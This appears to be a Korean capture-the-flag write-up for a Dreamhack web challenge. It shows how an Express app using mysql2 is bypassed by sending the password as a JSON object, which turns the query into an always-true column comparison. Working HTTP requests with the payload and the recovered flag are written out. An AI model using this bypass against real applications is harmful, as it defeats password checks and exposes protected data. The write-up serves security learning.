```c
app.use(express.urlencoded({ extended: false }));
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));
```
---
입력을 받을때 urlencoded랑 json 두가지 방식이있다

우선 이번 취약점은 json으로 변환하면서 발생했다

---
```c
app.post('/article/:id', async (req, res) => {
  const id = req.params.id;
  const { password } = req.body;

  const q = 'SELECT id, title, author, content FROM articles WHERE id = ? AND is_private = 1 AND password = ? LIMIT 1';
  try {
    const rows = await dbQuery(q, [id, password]);
    if (!rows || rows.length === 0) {
      const metaQ = 'SELECT id, title, author FROM articles WHERE id = ? LIMIT 1';
      const metaRows = await dbQuery(metaQ, [id]);
      const meta = (metaRows && metaRows[0]) ? metaRows[0] : { id, title: 'Unknown', author: '' };
      return res.render('article', { article: meta, showPasswordForm: true, error: 'Wrong Password.' });
    }
```

```c
const rows = await dbQuery(q, [id, password]);
```
여기서 이부분 객체로 입력받음

```c
password = "fakepasswd"
// 생성되는 쿼리:
WHERE id = 2 AND is_private = 1 AND password = 'fakepasswd'
```
일반적으로 이렇게 박힘 burp suit로 확인함

```c
password = {"password": 1}
// mysql2가 객체를 보면 key=value 형태로 펼쳐버림
WHERE id = 2 AND is_private = 1 AND password = `password` = 1
//                                              ^^^^^^^^^^
//                                         컬럼명으로 해석됨!
```
이렇게 json으로 박으면 컬럼으로 해석되면서 mysql2에서 발생하는 취약점이였음

```c
(password = `password`) = 1
--  ^^^^^^^^^^^^^^^^
--  컬럼과 컬럼을 비교 → 항상 true(1)
--  1 = 1 → true
```
이렇게 컬럼이 해석됨

---
```request
POST /article/2 HTTP/1.1
Host: host3.dreamhack.games:14721
Content-Length: 11
Cache-Control: max-age=0
Accept-Language: ko-KR,ko;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Origin: http://host3.dreamhack.games:14721
#Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://host3.dreamhack.games:14721/article/2
Accept-Encoding: gzip, deflate, br
If-None-Match: W/"3f7-Px4Ca2BkALkG8Y8wfsuPiLR9yR0"
Connection: keep-alive

password=aa
```

post문을 보면 이렇게 있는데 여기서 # 쳐둔부분을
```request
#Content-Type: application/x-www-form-urlencoded

-> change

#Content-Type: application/json
```
이렇게 바꾸고

```requset
POST /article/2 HTTP/1.1
Host: host3.dreamhack.games:14721
Content-Length: 11
Cache-Control: max-age=0
Accept-Language: ko-KR,ko;q=0.9
Origin: http://host3.dreamhack.games:14721
Content-Type: application/json
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://host3.dreamhack.games:14721/article/2
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

{
"password":{"password":1}
}
```

이런식으로 아래 password를 객체로 바인딩하면 해석이 위에처럼되면서 풀림

```c
DH{Un5E3n_sql_Inj3cT10N_LOL}
```
